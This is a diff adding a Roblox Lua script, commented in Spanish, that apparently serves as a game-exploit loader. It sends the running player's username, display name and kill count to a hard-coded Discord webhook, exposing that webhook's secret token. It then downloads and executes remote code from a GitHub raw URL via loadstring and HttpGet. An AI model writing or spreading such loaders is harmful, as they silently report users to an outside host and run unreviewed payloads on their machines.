@@ -1,0 +1,37 @@
+-- Servicios
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+
+-- Configuración del Webhook
+local webhookURL = "https://discordapp.com/api/webhooks/1405697269172535307/aJuqIP4diurnsl9fcELVLuxct-cBiqciXGp-2bfXPomJHtnVo5W1k9xWu6WXCAKgUF5C"
+
+-- Función para enviar mensaje al webhook
+local function sendDiscordWebhook(player, kills)
+    local data = {
+        ["content"] = "",
+        ["embeds"] = {{
+            ["title"] = "Jugador ejecutó el script",
+            ["description"] = string.format("**User:** %s\n**Display Name:** %s\n**Kills:** %d", player.Name, player.DisplayName, kills),
+            ["color"] = 0x00ff00
+        }}
+    }
+
+    local jsonData = HttpService:JSONEncode(data)
+    HttpService:PostAsync(webhookURL, jsonData, Enum.HttpContentType.ApplicationJson)
+end
+
+-- Función principal al ejecutar el script
+local function onScriptExecute(player)
+    -- Obtener kills
+    local kills = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Kills") and player.leaderstats.Kills.Value or 0
+
+    -- Enviar webhook
+    sendDiscordWebhook(player, kills)
+
+    -- Ejecutar tu script adicional
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/CoronaBlanca/25092009ML/refs/heads/main/Killer"))()
+end
+
+-- Ejecutar al jugador local
+local LocalPlayer = Players.LocalPlayer
+onScriptExecute(LocalPlayer)
